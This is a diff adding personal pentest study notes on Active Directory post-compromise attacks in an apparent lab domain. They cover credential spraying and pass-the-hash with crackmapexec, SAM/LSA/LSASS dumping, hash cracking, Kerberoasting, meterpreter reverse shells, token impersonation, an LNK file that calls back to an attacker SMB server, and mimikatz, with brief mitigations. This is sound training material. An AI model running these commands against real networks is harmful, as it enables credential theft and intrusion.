@@ -1,0 +1,133 @@
+## Post Compromise Attacks
+### methodology
+LLMNR -> get fcastle hash -> cracked -> sprayed the password -> found new login -> secret dump those logins -> local admin hashes -> respray network with local accounts  
+Quick wins
+- Kerberoasting
+- Secretsdump
+- Pass the Hash / Pass the password PTH PTP
+Dig Deep 
+- Enumerate (bloodhound, etc)
+- Where does your account have access?
+- Old vulns die hard!
+
+
+### crackmapexec  / NetExec
+All these commmands are not netexec I think  
+`crackmapexec smb -L`  list built-in modules  
+`netexec smb 192.168.176.0/24 -u fcastle -p 'Password1' --local-auth`   Pass local credentials  
+`crackmapexec smb 10.0.0.25/24 -u fcastle -d MARVEL.local -p Password1`   Pass domain credential around to machines in subnet, to check login  
+`crackmapexec smb 10.0.0.25/24 -u administrator -H aad3b4345... --local-auth`  Pass hash to attempt local non-domain login  
+`crackmapexec smb 10.0.0.25/24 -u administrator -H aad3b4345... --local-auth -sam`  dump SAM  
+`crackmapexec smb 10.0.0.25/24 -u administrator -H aad3b4345... --local-auth --shares`  enumerate shares  
+`crackmapexec smb 10.0.0.25/24 -u administrator -H aad3b4345... --local-auth --lsa`  dump local security authority   
+`crackmapexec smb 10.0.0.25/24 -u administrator -H aad3b4345... --local-auth --lsa`  dump local security authority  
+`crackmapexec smb 10.0.0.25/24 -u administrator -H aad3b4345... --local-auth -M lsassy`  dump LSASS memory creds  
+`cmedb` crackmapexec also has a database CMEDB  
+once in cmedb, type help, host, creds, shares.. etc.. ***very useful!***
+
+If SMB share is exposed, this will put LNK file there, that talks back to your attacker IP/SERVER
+`netexec smb 192.168.172.137 -d MARVEL.local  -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.176.129`
+
+
+
+<https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b>  
+<https://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html>  
+***
+
+### secretsdump
+`secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.176.137`  : Dump local sam hashes   
+`secretsdump.py administrator:@192.168.176.138 -hashes aad3b43..` : same but with hash instead of pw   
+
+### Cracking HASHES
+format =    LM________________**:**______________NT   
+aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f   
+
+We ***ONLY*** need the NT portion for cracking  
+
+```
+hashcat --help | grep NTLM   
+hashcat -m 1000 7facdc498ed1680c4fd1448319a8c04f /usr/share/wordlists/rockyou.txt   
+hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt   
+hashcat -m 1000 ntlm.txt --show
+7facdc498ed1680c4fd1448319a8c04f:Password1!
+```
+***
+### Mitigating PTH and Pass the Password
+Avoid using local admin passwords, use LAPS  
+Disable guest accounts  
+Limit who is local admin  
+Utilize strong passwords > 14 characters  
+Use PAM (privilege access management)  
+***
+### Kerberoasting  
+Taking TGS, encrypted with servers account hash, and  attempt to crack the hash
+`python GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.176.121 -request`  
+`hashcat -m 13100 kerberoast.txt rockyou.txt`   - CRACKING TGS encrypted hash  
+#### Kerberoasting Mitigations
+Strong passwords, least privilege   
+***
+### Token Impersonation  
+Tokens = temporary keys that allow you access to a system/network without providing credentials.  Think cookies for computers.  
+#### Token TYPES  
+1. Delegate - created for logging into a machine or using RDP  
+2. Impersonate - "non-interactive" such as attaching a network drive or a domain logon script  
+
+Metasploit INCOGNITO module allows us to impersonate user from shell  
+```
+msfconsole
+use exploit/windows/smb/psexec  
+rhosts -> punisher  SMBuser: fcastle SMBPass : Password1 Payload : windows/x64/meterpreter/reverse_tcp > exploit  
+```  
+once we have shell: `load incognito`  then : `list_tokens -u`  
+```
+meterpreter > impersonate_token marvel\\fcastle
+[+] Delegation token available
+[+] Successfully impersonated user MARVEL\fcastle
+```
+
+#### Toekn Impersonation Mitigation  
+Limit user/group token creation permissions  
+Account tiering 0/1/2 etc  
+Local admin restriction   
+
+### LNK File Attack  
+Placing a malicious file in a shared folder   
+<https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf>  
+Launch responder to wait for someone to click our evil file :  
+`sudo responder -I eth0 -dP`  
+If SMB share is exposed, this will put LNK file there, that talks back to your attacker IP/SERVER  
+`netexec smb 192.168.172.137 -d MARVEL.local  -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.176.129`  
+
+Manual way to do same as netexec 
+```
+# PS example
+$objShell = New-Object -ComObject WScript.shell
+$lnk = $objShell.CreateShortcut("C:\test.lnk")
+$lnk.TargetPath = "\\192.168.176.129\@test.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Test"
+$lnk.Hotkey = "Ctrl+Alt+T"
+$lnk.Save()
+```
+
+### GPP / cPassword Attack
+Group Policy Preferences embedded credentials, password were encrypted and placed in "cPassword"  
+`gpp-decrypt  JumpledPasswordPulledFromGroupPolicy`
+
+Metasploit module smb_enum_gpp  
+####  GPP mitigations
+Patch, fixed in KB2962486, 
+Delete old GPP xml files stored in SYSVOL
+***  
+
+### Mimikatz  
+Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks  
+Dump credentials stored in memory  
+Credential dumping, PTH, Over-PTH, Pass-the-ticket PTT, silver ticket, golden ticket  
+
+``` 
+privilege::debug
+sekurlsa::logonPasswords
+
+```
